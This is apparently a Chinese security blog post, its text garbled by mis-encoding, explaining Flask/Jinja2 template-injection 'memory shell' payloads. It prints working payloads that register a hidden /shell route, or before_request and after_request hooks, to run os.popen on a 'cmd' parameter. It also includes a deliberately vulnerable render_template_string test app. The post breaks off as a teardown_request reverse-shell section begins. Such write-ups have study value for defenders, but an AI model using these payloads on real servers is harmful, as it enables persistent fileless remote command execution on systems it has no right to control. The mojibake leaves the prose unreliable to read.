        <content type="html"><![CDATA[<h2 id="å‰ç½®"><a href="#å‰ç½®" class="headerlink" title="å‰ç½®"></a>å‰ç½®</h2><h3 id="ä»€ä¹ˆæ˜¯å†…å­˜é©¬"><a href="#ä»€ä¹ˆæ˜¯å†…å­˜é©¬" class="headerlink" title="ä»€ä¹ˆæ˜¯å†…å­˜é©¬"></a>ä»€ä¹ˆæ˜¯å†…å­˜é©¬</h3><p>å†…å­˜é©¬æ˜¯ä¸€ç§<strong>æ— æ–‡ä»¶è½åœ°</strong>çš„æ¶æ„ä»£ç ã€‚ä¸åŒäºä¼ ç»Ÿçš„webshellï¼šé€šå¸¸æ˜¯ä¸€ä¸ªæ–‡ä»¶ã€‚æ”»å‡»è€…åˆ©ç”¨æŸäº›ä¸­é—´ä»¶çš„è¿›ç¨‹æ‰§è¡Œå†…å­˜é©¬ï¼Œä»è€Œè¿›è¡Œgetshellï¼</p><h3 id="flaskçš„å†…å­˜é©¬åˆæ€ä¹ˆè¯´"><a href="#flaskçš„å†…å­˜é©¬åˆæ€ä¹ˆè¯´" class="headerlink" title="flaskçš„å†…å­˜é©¬åˆæ€ä¹ˆè¯´"></a>flaskçš„å†…å­˜é©¬åˆæ€ä¹ˆè¯´</h3><p>å°±æ˜¯åˆ©ç”¨flaskçš„sstiæ¼æ´ï¼Œè¿›è¡Œæ’å…¥å†…å­˜é©¬ï¼ä¸å…¶è¯´æ˜¯flaskçš„sstiï¼Œä¸å¦‚è¯´æ˜¯jinja2çš„ï¼Œæ¨¡æ¿å¼•æ“æ˜¯jinja2ï¼</p><h2 id="æ—§é©¬ï¼ˆflask2-xï¼‰"><a href="#æ—§é©¬ï¼ˆflask2-xï¼‰" class="headerlink" title="æ—§é©¬ï¼ˆflask2.xï¼‰"></a>æ—§é©¬ï¼ˆflask2.xï¼‰</h2><h3 id="payloadåˆ†æ"><a href="#payloadåˆ†æ" class="headerlink" title="payloadåˆ†æ"></a>payloadåˆ†æ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯¹pyaloadè¿›è¡Œé€ä¸€åˆ†æ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å…ˆå°±æ˜¯æ‰¾evalç”¨äºpythonä»£ç ï¼Œå½“ç„¶execä¹Ÿå¯ä»¥ï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span></span><br></pre></td></tr></table></figure><p>appæ˜¯Flaskç±»çš„å®ä¾‹ï¼Œç®€å•æ¥è¯´å°±æ˜¯Flaskåº”ç”¨æœ¬èº«ï¼</p><p>add_url_ruleæ˜¯Flaskæ¡†æ¶ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒæ–¹æ³•ï¼Œç”¨äºæ‰‹åŠ¨æ·»åŠ URLè·¯ç”±è§„åˆ™ï¼</p><p>æˆ‘ä»¬é€šè¿‡è·Ÿè¿›routeè¿™ä¸ªè£…é¥°å™¨å‡½æ•°ï¼Œæ‰¾åˆ°add_url_ruleåœ¨è·Ÿè¿›å®ƒï¼Œæ‹¿åˆ°æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_url_rule</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        rule: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        endpoint: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        view_func: ft.RouteCallable | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        provide_automatic_options: <span class="built_in">bool</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        **options: t.<span class="type">Any</span>,</span></span><br><span class="line"><span class="params">    </span>)</span><br></pre></td></tr></table></figure><p>ä¸»è¦å°±æ˜¯çœ‹ä¸‰ä¸ªå‚æ•°</p><ul><li>ruleï¼šå‡½æ•°å¯¹åº”çš„<code>URL</code>è§„åˆ™, æ»¡è¶³æ¡ä»¶å’Œ<code>app.route</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸€æ ·, å¿…é¡»ä»¥<code>/</code>å¼€å¤´</li><li>endpointï¼šè·¯ç”±çš„ç«¯ç‚¹åç§°ï¼Œæ˜¯ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼Œç”¨äºåœ¨ Flask å†…éƒ¨å¼•ç”¨è¿™ä¸ªè·¯ç”±ã€‚è¯´ç™½äº†å°±æ˜¯ä¸€ä¸ªå‡½æ•°å</li><li>view_funcï¼šå¤„ç†è¿™ä¸ªè·¯ç”±è¯·æ±‚çš„è§†å›¾å‡½æ•°ï¼Œå½“å®¢æˆ·ç«¯è®¿é—®è¿™ä¸ªè·¯å¾„æ—¶ï¼Œä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚</li></ul><p>æ¥ä¸‹æ¥å°±çœ‹è°ƒç”¨çš„è¿™ä¸ªå‡½æ•°äº†</p><p>lambdaæ˜¯ä¸€ä¸ªæ— åå‡½æ•°ï¼Œ:åé¢æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ç”¨äºå®ç°å‡½æ•°çš„åŠŸèƒ½ï¼è¿™é‡Œå°±æ˜¯å¯¼å…¥å‘½ä»¤å‡½æ•°ï¼Œé‚£ä¹ˆ<code>_request_ctx_stack.top</code>è¿™ä¸ªåˆæ˜¯ä»€ä¹ˆç©æ„ï¼Ÿ</p><h4 id="flaskè¯·æ±‚ä¸Šä¸‹æ–‡æœºåˆ¶"><a href="#flaskè¯·æ±‚ä¸Šä¸‹æ–‡æœºåˆ¶" class="headerlink" title="flaskè¯·æ±‚ä¸Šä¸‹æ–‡æœºåˆ¶"></a>flaskè¯·æ±‚ä¸Šä¸‹æ–‡æœºåˆ¶</h4><blockquote><p>å½“ç½‘é¡µè¯·æ±‚è¿›å…¥<code>Flask</code>æ—¶, ä¼šå®ä¾‹åŒ–ä¸€ä¸ª<code>Request Context</code>. åœ¨<code>Python</code>ä¸­åˆ†å‡ºäº†ä¸¤ç§ä¸Šä¸‹æ–‡: è¯·æ±‚ä¸Šä¸‹æ–‡(request context)ã€åº”ç”¨ä¸Šä¸‹æ–‡(session context). ä¸€ä¸ªè¯·æ±‚ä¸Šä¸‹æ–‡ä¸­å°è£…äº†è¯·æ±‚çš„ä¿¡æ¯, è€Œä¸Šä¸‹æ–‡çš„ç»“æ„æ˜¯è¿ç”¨äº†ä¸€ä¸ª<code>Stack</code>çš„æ ˆç»“æ„, ä¹Ÿå°±æ˜¯è¯´å®ƒæ‹¥æœ‰ä¸€ä¸ªæ ˆæ‰€æ‹¥æœ‰çš„å…¨éƒ¨ç‰¹æ€§. <code>request context</code>å®ä¾‹åŒ–åä¼šè¢«<code>push</code>åˆ°æ ˆ<code>_request_ctx_stack</code>ä¸­, åŸºäºæ­¤ç‰¹æ€§ä¾¿å¯ä»¥é€šè¿‡è·å–æ ˆé¡¶å…ƒç´ çš„æ–¹æ³•æ¥è·å–å½“å‰çš„è¯·æ±‚.</p></blockquote><p>é‚£ä¹ˆè¯´ç™½äº†å°±æ˜¯è¯·æ±‚çš„å‚¨å­˜çš„ç»“æ„å¼æ ˆç»“æ„ï¼Œåè¿›å…ˆå‡ºï¼Œç„¶åé€šè¿‡<code>_request_ctx_stack.top</code>è·å–æ ˆé¡¶å…ƒç´ ä¹Ÿå°±æ˜¯æœ€æ–°è¯·æ±‚ï¼</p><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å°±æ˜ç™½äº†</p><p><code>_request_ctx_stack.top.request.args.get(&#39;cmd&#39;,&#39;whoami&#39;)</code>å°±æ˜¯è·å¾—è¯·æ±‚çš„cmdå‚æ•°ï¼Œé»˜è®¤å€¼æ˜¯whoami</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>evalçš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸ªå­—å…¸ç”¨äºå£°æ˜é‡Œé¢çš„å…¨å±€å˜é‡ï¼Œç”¨æ¥æŒ‡å®š<code>exec()</code> æˆ– <code>eval()</code> çš„<strong>ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆå³è¦æ‰§è¡Œçš„ä»£ç å­—ç¬¦ä¸²ï¼‰ä¸­å¼•ç”¨çš„ã€ä½†å¹¶æœªåœ¨ä»£ç å­—ç¬¦ä¸²å†…éƒ¨å®šä¹‰</strong>çš„é‚£äº›å˜é‡</p><p>åˆ°è¿™æ•´ä¸ªpyloadå°±åˆ†æå®Œäº†</p><h3 id="æœ¬åœ°test"><a href="#æœ¬åœ°test" class="headerlink" title="æœ¬åœ°test"></a>æœ¬åœ°test</h3><p>é¦–å…ˆå®‰è£…</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install flask==<span class="number">2</span>.<span class="number">0</span>.<span class="number">0</span></span><br><span class="line">pip install werkzeug==<span class="number">2</span>.<span class="number">0</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯è¿è¡Œè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    template=<span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">    &lt;p&gt;Hello %s &lt;/p&gt;&#x27;&#x27;&#x27;</span>%(request.args.get(<span class="string">&#x27;name&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)      <span class="comment"># æ¸²æŸ“ä¸ºhtmlå†…å®¹</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:          <span class="comment"># å¦‚æœä½œä¸ºè„šæœ¬è¿è¡Œï¼Œè€Œä¸æ˜¯è¢«å½“æˆæ¨¡å—å¯¼å…¥</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ‰“å…¥å†…å­˜é©¬ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p><img src="/images/achieve/2025/10/4.png"></p><p>æˆåŠŸéå¸¸niceï¼</p><h2 id="æ–°é©¬ï¼ˆflask3-xï¼‰"><a href="#æ–°é©¬ï¼ˆflask3-xï¼‰" class="headerlink" title="æ–°é©¬ï¼ˆflask3.xï¼‰"></a>æ–°é©¬ï¼ˆflask3.xï¼‰</h2><p>ä¸ºå•¥æ–°ç‰ˆæœ¬çš„ä¸è¡Œï¼Ÿä¸»è¦æ˜¯æŠ¥é”™</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">AssertionError: <span class="title">The</span> <span class="title">setup</span> <span class="title">method</span> &#x27;<span class="title">add_url_rule</span>&#x27; <span class="title">can</span> <span class="title">no</span> <span class="title">longer</span> <span class="title">be</span> <span class="title">called</span> <span class="title">on</span> <span class="title">the</span> <span class="title">application</span>. <span class="title">It</span> <span class="title">has</span> <span class="title">already</span> <span class="title">handled</span> <span class="title">its</span> <span class="title">first</span> <span class="title">request</span>, <span class="title">any</span> <span class="title">changes</span> <span class="title">will</span> <span class="title">not</span> <span class="title">be</span> <span class="title">applied</span> <span class="title">consistently</span>.</span></span><br></pre></td></tr></table></figure><p>åœ¨åº”ç”¨å¯åŠ¨ä¹‹åè¯´æ˜¯ä¸èƒ½ç”¨add_url_ruleè¿›è¡Œæ·»åŠ è·¯ç”±ï¼</p><h3 id="è£…é¥°å™¨"><a href="#è£…é¥°å™¨" class="headerlink" title="è£…é¥°å™¨"></a>è£…é¥°å™¨</h3><p>ä»€ä¹ˆæ˜¯è£…é¥°å™¨ï¼Ÿ</p><p>è£…é¥°å™¨æ˜¯ä¸€ç§ç”¨äº<strong>ä¿®æ”¹æˆ–å¢å¼ºå‡½æ•°æˆ–æ–¹æ³•è¡Œä¸º</strong>çš„é«˜çº§å‡½æ•°ã€‚è£…é¥°å™¨æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ¥å—å‡½æ•°ä½œä¸ºå‚æ•°å¹¶è¿”å›ä¸€ä¸ªæ–°å‡½æ•°çš„å‡½æ•°ã€‚</p><h4 id="åˆ©ç”¨before-request"><a href="#åˆ©ç”¨before-request" class="headerlink" title="åˆ©ç”¨before_request"></a>åˆ©ç”¨before_request</h4><p>before_request æ–¹æ³•å…è®¸æˆ‘ä»¬åœ¨æ¯ä¸ªè¯·æ±‚ä¹‹å‰æ‰§è¡Œä¸€äº›æ“ä½œ,è·Ÿè¿›å®ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>(<span class="params">self, f: T_before_request</span>) -&gt; T_before_request:</span><br><span class="line">    <span class="variable language_">self</span>.before_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><p><code>self.before_request_funcs</code> æ˜¯ Flask åº”ç”¨å¯¹è±¡ä¸­çš„ä¸€ä¸ªå±æ€§ã€‚å®ƒæ˜¯ä¸€ä¸ª <strong>å­—å…¸</strong>ï¼Œç”¨äºå­˜å‚¨åœ¨è¯·æ±‚å¤„ç†ä¹‹å‰éœ€è¦æ‰§è¡Œçš„é’©å­å‡½æ•°ã€‚</p><p><code>setdefault(None,[]).append(f)</code>è¿™ä¸ªå…¶å®å°±æ˜¯ç”¨æ¥å¢åŠ æ–°çš„é’©å­å‡½æ•°çš„ï¼é‚£ä¹ˆæˆ‘ä»¬æ’å…¥lambda:<strong>import</strong>(â€˜osâ€™).popen(_request_ctx_stack.top.request.args.get(â€˜cmdâ€™, â€˜whoamiâ€™)).read()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;</span>,&#123;<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸å®šä¹‰å­—å…¸ä¹Ÿå¯ä»¥å»sys.modulesé‡Œé¢å»æ‰¾</p><blockquote><p>sys.modulesæ˜¯ä¸€ä¸ªå…¨å±€å­—å…¸ï¼Œè¯¥å­—å…¸æ˜¯pythonå¯åŠ¨åå°±åŠ è½½åœ¨å†…å­˜ä¸­ã€‚æ¯å½“ç¨‹åºå‘˜å¯¼å…¥æ–°çš„æ¨¡å—ï¼Œsys.moduleséƒ½å°†è®°å½•è¿™äº›æ¨¡å—ã€‚å­—å…¸sys.moduleså¯¹äºåŠ è½½æ¨¡å—èµ·åˆ°äº†ç¼“å†²çš„ä½œç”¨ã€‚å½“æŸä¸ªæ¨¡å—ç¬¬ä¸€æ¬¡å¯¼å…¥ï¼Œå­—å…¸sys.moduleså°†è‡ªåŠ¨è®°å½•è¯¥æ¨¡å—ã€‚å½“ç¬¬äºŒæ¬¡å†å¯¼å…¥è¯¥æ¨¡å—æ—¶ï¼Œpythonä¼šç›´æ¥åˆ°å­—å…¸ä¸­æŸ¥æ‰¾ï¼Œä»è€ŒåŠ å¿«äº†ç¨‹åºè¿è¡Œçš„é€Ÿåº¦</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&quot;</span>)</span><br></pre></td></tr></table></figure><p>å½“ç„¶æ‰¾appè¿™ä¸ªå¯¹è±¡çš„æ–¹æ³•ä¸ç»å¯¹ï¼Œéšæœºåº”å˜å³å¯</p><p>è¿™ä¸ªpayloadçš„ç¼ºç‚¹å°±æ˜¯åªèƒ½ç”¨ä¸€æ¬¡ï¼Œæ¯•ç«Ÿä½ æ‰“å…¥ä¹‹åæ¯æ¬¡è¯·æ±‚ä¹‹å‰å°±ä¼šæ‰§è¡Œæˆ‘ä»¬æ’å…¥çš„lambdaå‡½æ•°ï¼</p><h4 id="åˆ©ç”¨after-request"><a href="#åˆ©ç”¨after-request" class="headerlink" title="åˆ©ç”¨after_request"></a>åˆ©ç”¨after_request</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">after_request</span>(<span class="params">self, f</span>):</span><br><span class="line">    <span class="variable language_">self</span>.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><p>å…ˆè‡ªå·±æ•´ä¸€æ•´</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url<span class="built_in">_</span>for.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;app.after<span class="built_in">_</span>request<span class="built_in">_</span>funcs.setdefault(None, []).append(lambda:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())&quot;,&#123;&#x27;app&#x27;:url<span class="built_in">_</span>for.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;current<span class="built_in">_</span>app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆä¸è¡Œï¼ˆåœ¨before_requestçš„åŸºç¡€ä¸Šæ”¹ï¼‰ï¼Œæ‰“å…¥è¿›å»ä¹‹åæ¯æ¬¡è¯·æ±‚ä¹‹åå°±ä¼šå°±æ˜¯æ‰§è¡Œæˆ‘ä»¬çš„å‡½æ•°ï¼Œä½†æ˜¯è¿™ä¸æ˜¯å“åº”å•Šå“¥ä»¬</p><p>æ¥åˆ†ææ­£ç¡®çš„payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    app.after_request_funcs.setdefault(None, []).append(</span></span><br><span class="line"><span class="string">        lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(</span></span><br><span class="line"><span class="string">            \&quot;\&quot;\&quot;</span></span><br><span class="line"><span class="string">            global CmdResp;</span></span><br><span class="line"><span class="string">            CmdResp = __import__(&#x27;flask&#x27;).make_response(</span></span><br><span class="line"><span class="string">                __import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()</span></span><br><span class="line"><span class="string">            )</span></span><br><span class="line"><span class="string">            \&quot;\&quot;\&quot;</span></span><br><span class="line"><span class="string">        ) == None else resp</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;request&#x27;</span>: url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>: url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>resp</code> ä»£è¡¨ Response Object (å“åº”å¯¹è±¡)å°±æ˜¯åŸæ¥çš„å“åº”ï¼<code>__import__(&#39;flask&#39;).make_response()</code>è¿™é‡Œå°±å¯çœ‹åˆ°æ˜¯éœ€è¦è°ƒç”¨make_response()è¿™ä¸ªå‡½æ•°æ¥ç”Ÿæˆæ–°çš„å“åº”å†…å®¹çš„</p><p><img src="/images/achieve/2025/10/5.png"></p><p>è¿™ä¸ªå°±çˆ½å¤šäº†ï¼</p><h3 id="hookå‡½æ•°"><a href="#hookå‡½æ•°" class="headerlink" title="hookå‡½æ•°"></a>hookå‡½æ•°</h3><p>è¿™ä¸ªä¸Šé¢å°±ç”¨åˆ°äº†ï¼Œæ’å…¥çš„å°±æ˜¯æˆ‘ä»¬å®šä¹‰çš„é’©å­å‡½æ•°</p><blockquote><p>æœ¬è´¨æ˜¯ï¼šå…è®¸ç”¨æˆ·åœ¨æŸä¸ªç‰¹å®šæ—¶æœºæ’å…¥è‡ªå®šä¹‰é€»è¾‘çš„ä¸€ç§æœºåˆ¶ï¼Œé€šä¿—ç‚¹è®²å°±æ˜¯ï¼Œé’©å­å‡½æ•°å°±åƒæ˜¯åœ¨ä¸€ä¸ªæµç¨‹ä¸­é¢„ç•™å‡ºæ¥çš„æŒ‚é’©ç‚¹ï¼Œä½ å¯ä»¥æŒ‚ä¸Šè‡ªå·±çš„å‡½æ•°æ¥æ”¹å˜æˆ–å¢å¼ºåŸæœ‰çš„è¡Œä¸º<br>è¿™ä¸ªæ˜¯ä¸æ˜¯å’Œå‰é¢çš„è£…é¥°å™¨ï¼ˆå¢å¼ºå‡½æ•°è¡Œä¸ºï¼‰æœ‰ç‚¹åƒï¼Œå…¶å®è£…é¥°å™¨æ˜¯å°±æ˜¯é€šè¿‡é’©å­å‡½æ•°æ¥å¢å¼ºå‡½æ•°çš„è¡Œä¸ºçš„</p></blockquote><p>ç‰¹ç‚¹ï¼š</p><ul><li>é¢„å®šä¹‰çš„è°ƒç”¨æ—¶æœºï¼šä¸æ˜¯ä½ ç›´æ¥è°ƒç”¨é’©å­å‡½æ•°ï¼Œè€Œæ˜¯æŸä¸ªç³»ç»Ÿã€æ¡†æ¶æˆ–åº“åœ¨åˆé€‚çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨å®ƒã€‚</li><li>ç”¨æˆ·è‡ªå®šä¹‰é€»è¾‘ï¼šä½ å†™çš„å‡½æ•°ä¼šè¢«å½“ä½œ â€œé’©å­â€ æ’å…¥åŸæµç¨‹ä¸­æ‰§è¡Œã€‚</li><li>å¯æ’æ‹”ã€çµæ´»æ‰©å±•ï¼šä¸éœ€è¦æ”¹åŠ¨åŸä»£ç ï¼Œå°±å¯ä»¥é€šè¿‡é’©å­å¢å¼ºåŠŸèƒ½</li></ul><h4 id="teardown-request"><a href="#teardown-request" class="headerlink" title="teardown_request"></a>teardown_request</h4><blockquote><p>teardown_request æ˜¯åœ¨æ¯ä¸ªè¯·æ±‚çš„æœ€åé˜¶æ®µæ‰§è¡Œçš„ï¼Œå³åœ¨è§†å›¾å‡½æ•°å¤„ç†å®Œæˆå¹¶ç”Ÿæˆå“åº”åï¼Œæˆ–è€…åœ¨è¯·æ±‚ä¸­å‘ç”Ÿæœªå¤„ç†çš„å¼‚å¸¸æ—¶ï¼Œéƒ½ä¼šæ‰§è¡Œè¿™ä¸ªé’©å­ã€‚</p><p>å®ƒæ‰§è¡Œçš„æ—¶æœºæ˜¯åœ¨å“åº”å·²ç»ç¡®å®šä¹‹åï¼Œä½†åœ¨æœ€ç»ˆå‘é€ç»™å®¢æˆ·ç«¯ä¹‹å‰ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">teardown_request</span>(<span class="params">self, f</span>):</span><br><span class="line">        <span class="variable language_">self</span>.teardown_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">        <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><p>ç”±äºæ˜¯æ— å›æ˜¾æ‰€ä»¥åå¼¹shellå’Œå†™å…¥æ–‡ä»¶éƒ½å¯ä»¥</p><p>åå¼¹shell</p><figure class="highlight 